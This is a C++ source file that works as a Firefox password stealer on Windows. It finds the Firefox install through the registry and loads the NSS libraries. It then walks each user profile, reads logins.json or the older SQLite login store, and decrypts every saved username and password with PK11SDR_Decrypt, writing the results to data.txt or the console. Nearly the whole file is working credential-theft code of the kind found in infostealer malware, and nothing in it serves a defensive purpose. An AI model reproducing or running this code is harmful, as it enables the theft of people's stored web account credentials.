#include "defs.h"
#include"firefox.h"

char g_ver[20] = { 0 };
using namespace std;

char* installPath()
{
	DWORD cbSize;
	char value[MAX_PATH];
	const char* path ="SOFTWARE\\Mozilla\\Mozilla Firefox";
	char path2[] = "SOFTWARE\\Mozilla\\Mozilla Firefox";
	cbSize = MAX_PATH;
	DWORD dwType = REG_SZ;

	
	if (!SHGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize))
	{
		path = dupcat(path, "\\", value, "\\Main" , 0);
#ifdef _DEBUG
		printf("dupcat return path is: %s\n", path);
#endif // _DEBUG

		strcpy(g_ver, value);
#ifdef _DEBUG
		printf(" g_ver value is: %s\n", g_ver);
		printf("value is: %s\n", value);
#endif // _DEBUG

		cbSize = MAX_PATH;

		
		if (!SHGetValueA(HKEY_LOCAL_MACHINE, path, "Install Directory", 0, value, &cbSize))
		{
			int size = strlen(value) + 1;
			char* ret = (char*)calloc(size, 1);
			memcpy(ret, value, size);
			delete[] path;
			/*printf("value of ret is %s:\n", ret);*/
			return ret;
		}

	}

	return NULL;

}

BOOL loadFunctions(char* installPath)
{
	/*printf("CONTROL ENTERED LOAD FUNCTION \n");*/
	if (installPath)
	{
		HMODULE mozGlue = LoadLibraryA((dupcat(installPath, "\\mozglue.dll", 0)));

		if (mozGlue == NULL)
		{
#ifdef _DEBUG
			printf("Failed LOADLibrary mozGLue \n");
#endif // _DEBUG
		}

		HMODULE hNSS = LoadLibraryA((dupcat(installPath, "\\nss3.dll", 0)));
		
		if (hNSS)
		{
			fpNSS_INIT = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
			fpNSS_Shutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
			PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(hNSS, "PK11_GetInternalKeySlot");
			PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(hNSS, "PK11_FreeSlot");
			PK11Authenticate = (PK11_Authenticate)GetProcAddress(hNSS, "PK11_Authenticate");
			PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(hNSS, "PK11SDR_Decrypt");
			isqlite3_open = (fpSqliteOpen)GetProcAddress(hNSS, "sqlite3_open");
			isqlite3_prepare_v2 = (fpSqlitePrepare_v2)GetProcAddress(hNSS, "sqlite3_prepare_v2");
			isqlite3_step = (fpSqliteStep)GetProcAddress(hNSS, "sqlite3_step");
			isqlite3_column_text = (fpSqliteColumnText)GetProcAddress(hNSS, "sqlite3_column_text");
			PLBase64Decode = (PL_Base64DecodeFunc)GetProcAddress(hNSS, "PL_Base64Decode");
			SECITEMZfreeItem = (SECITEM_ZfreeItemFunc)GetProcAddress(hNSS, "SECITEM_ZfreeItem");

		}
		return !(!fpNSS_INIT || !fpNSS_Shutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PLBase64Decode || !SECITEMZfreeItem);
	}
	return  FALSE;
}


char * handle_credential_password(const char* password)
{
	int len = 0;
	char* decoded;
	int adjust = 0;
	int decodeLen;
	SECItem request;
	SECItem reply;
	SECStatus status;
	char* plaintext;
	adjust = 0;

	len = (unsigned int)strlen(password);
	if (password[len - 1] == '=')
	{
		adjust++;
		if (password[len - 2] == '=')
			adjust++;
	}
	if ((decoded = (char*)PLBase64Decode(password, len, NULL)) == NULL) {
		return 0;
	}

	decodeLen = (len * 3) / 4 - adjust;

	request.data = (unsigned char*)decoded;
	request.len = decodeLen;
	reply.data = 0;
	reply.len = 0;

	if ((status = PK11SDRDecrypt(&request, &reply, NULL)) != SECSuccess) {
		return 0;
	}

	if ((plaintext = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, reply.len + 1)) == NULL) {
		SECITEMZfreeItem(&request, PR_FALSE);
		SECITEMZfreeItem(&reply, PR_FALSE);
		return 0;
	}

	strncpy_s(plaintext, reply.len + 1, (const char*)reply.data, reply.len);
	plaintext[reply.len] = '\0';

	return plaintext;

	HeapFree(GetProcessHeap(), 0, plaintext);
	plaintext = NULL;
	SECITEMZfreeItem(&request, PR_FALSE);
	SECITEMZfreeItem(&reply, PR_FALSE);
}


void showDecryptedPasswords()
{
	char path[MAX_PATH];
	char appData[MAX_PATH], profile[MAX_PATH];
	char sections[4096];

	LSTATUS check4 = SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, (appData));
	_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\profiles.ini", appData);
	DWORD PriPro = GetPrivateProfileSectionNamesA(sections, 4096,path);

	char* p = sections;
	
	while (1)
	{
		
		if (_strnicmp(p, "Profile", 7) == 0)
		{
			DWORD PriStr= GetPrivateProfileStringA(p, "Path", NULL, profile, MAX_PATH,path);
			_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\Profiles\\%s", appData, std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());
			if (!(*fpNSS_INIT)(path))
			{
				int ver = atoi(g_ver);
				if (ver < 32)
				{
					char* database = dupcat(path, "\\signos.sqlite", 0);
					int entries = 0;
					sqlite3* db;
					if (isqlite3_open(database, &db) == SQLITE_OK)
					{
						sqlite3_stmt* stmt;
						const char* query = "SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins";
						if (isqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK)
						{
							FILE* out2 = fopen("data.txt", "a+");
							if (out2)
							{
#ifdef _DEBUG
								fprintf(out2, "%s\n\n", "From mozilla Firefox:\n");

#endif // _DEBUG

								while (isqlite3_step(stmt) == SQLITE_ROW)
								{
									//fprintf(out2, "%s\n", dupncat("-", 50));
									char* user, * password, * site;
									user = (char*)isqlite3_column_text(stmt, 0);
									password = (char*)isqlite3_column_text(stmt, 1);
									site = (char*)isqlite3_column_text(stmt, 2);
									entries++;
#ifdef _DEBUG

									fprintf(out2, "Entry: %d\n", entries);
									fprintf(out2, "URL: %s\n", site);
									fprintf(out2, "Username: %s\n", handle_credential_password(user));
									fprintf(out2, "Passwod: %s\n", handle_credential_password(password));
#endif // _DEBUG

									//fprintf(out2, "%s\n", dupncat("-", 50));
								}
								fclose(out2);
							}
							delete[]database;
						}
						else
						{
#ifdef _DEBUG
							printf("Can't prepare database! \n");

#endif // _DEBUG
						}
					}
					else
#ifdef _DEBUG
						printf("Can't open database! \n");
#endif // _DEBUG

					if (entries == 0)
					{
#ifdef _DEBUG
						printf("No entries found in %s \n", database);
#endif // _DEBUG

					}
				}
				else
				{
					char* jsonfile = dupcat(path, "\\logins.json", 0);
					FILE* loginJson;
					DWORD JsonFileSize = 0;
					char* p, * q, * qu;
					int entries = 0;

					loginJson = fopen(jsonfile, "r");
					if (loginJson)
					{
						fseek(loginJson, 0, SEEK_END);
						JsonFileSize = ftell(loginJson);
						fseek(loginJson, 0, SEEK_SET);

						p = new char[JsonFileSize + 1];
						fread(p, 1, JsonFileSize, loginJson);

						{
#ifdef _DEBUG
							printf("%s\n\n", "From Mozilla Firefox:\n");
#endif //_DEBUG

							while ((q = strstr(p, "formSubmitURL")) != NULL)
							{

								//fprintf(out2, "%s\n", dupncat("-", 50));
#ifdef _DEBUG
								printf("Entry: %d\n", entries++);
#endif // _DEBUG

								q += strlen("formSubmitURL") + 3;
								qu = strstr(q, "usernameField") - 3;
								*qu = '\0';

								//fprintf(out2, "URL: %s\n", q);
#ifdef _DEBUG
								printf("URL: %s\n", q);
#endif // _DEBUG

								q = strstr(qu + 1, "encryptedUsername") + strlen("encryptedUsername") + 3;
								qu = strstr(q, "encryptedPassword") - 3;
								*qu = '\0';
								//fprintf(out2, "username: %s\n", handle_credential_username(q));
#ifdef _DEBUG
								printf("username: %s\n", handle_credential_password(q));
#endif // _DEBUG

								q = strstr(qu + 1, "encryptedPassword") + strlen("encryptedPassword") + 3;
								qu = strstr(q, "guid") - 3;
								*qu = '\0';
								//fprintf(out2, "Password: %s\n", handle_credential_password(q));
#ifdef _DEBUG
								printf("Password: %s\n", handle_credential_password(q));
#endif // _DEBUG
								p = qu + 1;
								//fprintf(out2, "%s\n", dupncat("-", 50));
							}

						}
						delete[]jsonfile;
						fclose(loginJson);
					}
					if (entries == 0)
					{
#ifdef _DEBUG
						printf("No entries found! \n");
#endif // _DEBUG
					}
				}

				(*fpNSS_Shutdown) ();

			}
			else
			{
#ifdef _DEBUG
			printf("NSS_INIT() error! \n");
#endif // _DEBUG
 }

		}

		p += strlen(p) + 1;
		if (p[0] == 0) break;

	}
	
}


